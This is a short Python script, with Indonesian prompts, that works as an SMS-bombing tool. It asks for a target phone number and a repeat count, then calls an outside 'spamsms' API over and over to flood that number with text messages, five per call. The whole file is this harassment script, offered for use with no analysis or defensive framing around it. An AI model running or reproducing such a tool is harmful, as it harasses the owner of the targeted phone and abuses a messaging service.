import requests,os,sys,time
from time import sleep
print ('Contoh nomor 8xxxxxxx')

nomor = input('Masukan Nomor :')
print ('- - - JUMLAH SPAM - - -')
print ('Input 1x Spam = 5SMS')
jm = int(input('Jumlah Spam :'))

for i in range(jm):
      req=requests.get("https://amfcode.my.id/api/spamsms",params={"phone":nomor}).text
      if "mengirim" in req:
            print ('Mengirim spam...')
      else:
            print ('Spam Berhasil!')



